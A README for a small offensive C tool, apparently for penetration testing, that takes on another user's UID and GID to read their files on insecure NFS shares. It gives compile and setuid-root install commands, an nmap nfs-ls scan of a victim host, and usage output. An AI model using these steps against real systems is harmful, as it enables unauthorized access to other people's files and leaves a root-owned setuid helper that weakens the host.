# Setme

**A simple binary made in C to make exploitation of insecure NFS systems easier from Linux host.**
This one binary avoids having to add users and groups (and later deleting) when going through many different users NFS directories.
##

**Installation**  
Download the file setMe.c from the repo.

Compile with:  
**gcc setme.c -o setMe**
Then:
sudo chown root:root ./setMe && sudo chmod gu+s ./setMe

*Considerations:*  
I would make sure you keep access to this binary very restricted, or delete after use- but I guess you know that since your a pro.

##
**Usage:
sudo nmap --script=nfs-ls** victimIP
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-09 15:08 MST  
Nmap scan report for 10.10.10.10  
Host is up (0.097s latency).  
Not shown: 993 closed ports  
PORT STATE SERVICE  
22/tcp open ssh  
25/tcp open smtp  
80/tcp open http  
110/tcp open pop3  
111/tcp open rpcbind  
| nfs-ls: Volume /home  
| access: Read Lookup NoModify NoExtend NoDelete NoExecute  
| PERMISSION **UID GID** SIZE TIME FILENAME  
| drwxr-xr-x 0 0 4096 2015-09-17T13:21:59 .  
| drwxr-xr-x 0 0 4096 2015-01-07T10:56:34 ..  
| drwxr-xr-x **1013 1013** 4096 2016-11-23T10:17:47 mike  
| drwxr-xr-x **1012 1012** 4096 2012-01-23T11:20:40 alex 
| drwxr-xr-x **1011 1011** 4096 2017-06-23T10:32:52 jeff
| drwxr-xr-x **1014 1014** 4096 2015-12-1T21:11:51 james  
|_  
119/tcp open nntp  
2049/tcp open nfs

Say we want to get into **mikes files**, we execute our binary with:
**./setME 1013 1013**
Then we can get varying levels of access to the files depending on how the permissions are set up on the share. 

**Another example:**
pop@kali:/setme/$ **./setMe 1013 1013**
$ **id**
uid=1013 gid=1013 groups=1013


We are now free to browse the nfs folder shares pertaining to the uid and gid in this shell.
To exit the shell type "exit".


